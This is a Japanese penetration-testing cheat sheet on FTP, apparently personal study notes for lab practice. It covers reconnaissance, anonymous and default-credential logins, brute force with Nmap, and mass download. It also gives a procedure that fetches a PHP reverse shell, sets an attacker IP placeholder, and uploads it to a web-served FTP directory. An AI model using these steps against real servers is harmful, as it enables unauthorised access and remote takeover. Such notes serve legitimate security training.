@@ -1,0 +1,167 @@
+- 関連ノート：
+	- [[Networkの脆弱性#FTP]]
+	- [[ファイル操作、ユーティリティ]]
+
+---
+
+# 留意点
+
+- FTPに`$IP`等の環境変数を使用してログインすると、すぐにキックアウトされるので、IPアドレスを直接指定すること
+- Nmap実行後やサーバの起動後すぐはftpサーバが停止していることがあるので1分ほど待つ
+
+---
+
+# FTPの基本
+
+FTPはTCPベースのネットワークで、あるホストから別のホストへファイルを転送するための標準プロトコル
+
+- クライアント・サーバーモデルで動作
+- 匿名アクセス（anonymous）と認証アクセスの2種類をサポート
+
+## Active・Passiveモード
+
+- ログイン後、`passive`コマンドで切り替え可能
+	- 自身の環境では、デフォルトはPassiveモード
+
+| 項目         | Activeモード                                    | Passiveモード（推奨）                   |
+| ---------- | -------------------------------------------- | -------------------------------- |
+| 制御接続の開始者   | クライアント → サーバー（TCP/21）                        | クライアント → サーバー（TCP/21）            |
+| データ接続の開始者  | サーバー → クライアント<br>(クライアントがサーバーに対し「私に接続して」と依頼) | クライアント → サーバー                    |
+| 使用ポート（データ） | クライアント側：TCP/20（送信元）                          | サーバーが選んだ高番ランダムポート                |
+| FWとの相性     | ❌ FTPサーバー(社外)→クライアント(社内)の接続は遮断されやすい          | ⭕️ クライアント(社内)から全接続を発信するので遮断されにくい |
+- 参考記事：[CentOSサーバー構築入門](http://cos.linux-dvr.biz/archives/131)
+
+---
+
+# 接続方法
+
+標準のftpコマンド
+```zsh
+ftp <TargetIP> [Port]
+````
+- ポート番号は省略可能（デフォルト21番）
+- ドメイン指定可
+
+💡lftpコマンド（拡張版）
+```zsh
+lftp <TargetIP> -u <username>
+```
+- ftpの拡張版で使いやすく、可視性も良いため、基本は==これを使う==（`ls -la`も可能）
+
+Webブラウザ経由
+```url
+ftp://<username>:<pw>@<TargetIP>
+```
+
+---
+
+# Recon
+
+NSEを使った包括的な列挙（情報量が多い）
+	（`-A`だけでは、defaultカテゴリのNSEしか実行しない）
+```zsh
+sudo nmap -p <Port> --script=ftp* -T4 <TargetIP>
+```
+- 💡`-sC`オプションでanonymousログインが可能かどうかを判断するため、Nmapの結果に"Anonymous FTP login allowed"となければ、わざわざanonymousログイン試行する必要なし
+
+バナーグラブ(Nmapで代替可)
+```zsh
+nc -nv <TargetIP> 21
+```
+- 接続時の応答メッセージからサービスとバージョンを特定
+
+デフォルト・一般的なディレクトリの列挙
+```zsh
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 100 -o gobuster_ftp.sh -u ftp://<TargetIP>
+```
+- 機密情報が含まれる可能性のあるディレクトリを発見
+
+---
+
+# Exploit
+
+## anonymous認証
+
+```zsh
+ftp <TargetIP>
+Name: anonymous
+Password: <任意のパスワード>
+```
+- パスワードは何でも良いし空白可
+
+## 一般的な認証情報の試行
+
+anonymousログインが無効な場合、よくある認証情報を試す
+```
+Username: admin / administrator / root / ftpuser / test
+Password: admin / password / root / 123456
+```
+- 💡ブルートフォースより先に試すべき
+
+## 認証情報のブルートフォース
+
+方法A：[[🐉THC-Hydra#サービスに対する辞書攻撃]]
+
+方法B：Nmapスクリプトによるブルートフォース
+```zsh
+nmap -p 21 --script ftp-brute <TargetIP>
+```
+
+---
+
+# 侵入後の操作（Post-Exploitation）
+
+💡全ファイルの**一括ダウンロード**
+```zsh
+# 例：wget -m ftp://anonymous:anonymous@<TargetIP>›
+wget -m ftp://<username>:<pw>@<TargetIP>[:Port]
+```
+- `-m`：ミラーリングモード
+
+## よく使うFTPコマンド一覧
+
+| コマンド     | 説明                                 | 使用例                            |
+| -------- | ---------------------------------- | ------------------------------ |
+| `lcd`    | ローカルディレクトリ(Kali側)の変更               | `lcd /path/to/directory`       |
+| `cd`     | サーバーディレクトリの変更                      | `cd /path/to/directory`        |
+| `ls`     | サーバーのファイル一覧表示                      | `ls`                           |
+| `get`    | サーバーからファイルをダウンロード                  | `get filename.txt`             |
+| `mget`   | 複数ファイルをダウンロード                      | `mget *.txt`                   |
+| `put`    | サーバーへファイルをアップロード                   | `put filename.txt`             |
+| `mput`   | 複数ファイルをアップロード                      | `mput *.txt`                   |
+| `binary` | バイナリ転送モードに設定（バイナリをアップロードするときに実行必須） | `binary`<br>`put filename.exe` |
+| `ascii`  | ASCII転送モードに設定                      | `ascii`                        |
+
+## Webサイト経由のリバースシェル
+
+- FTPディレクトリがWeb経由でアクセス可能で、WebサーバーがPHPファイルを実行できる場合に有効
+- `ftp > ls`の結果、`index.php`が存在したらこの方法が使える蓋然性が高い
+
+1. ペイロードのダウンロード
+```zsh
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+```
+
+2. shell.phpの編集
+```php
+$ip = '<AttackerIP>';
+$port = <Port>;
+```
+
+3. FTPサーバーにペイロードをアップロード
+```zsh
+ftp <TargetIP>
+```
+```zsh
+ftp> put shell.php
+```
+- ブラウザでアップロード先のURLにアクセスすると、リスナーへ接続が確立される
+- ⚠️FTPディレクトリへのWebパスを正確に特定する必要がある
+
+---
+
+# トラブルシューティング
+
+- "29 Entering Extended Passive Mode (|||10092|) 150 Opening BINARY mode data connection for xxx (2590 bytes)."と出力されて止まる
+	- →VPNのパケット制限がかかっている可能性があるため、`sudo ifconfig tun0 mtu 1200`としてからダウンロード
+	- →FWで遮断されている可能性があるため、`passive on`としてからダウンロード
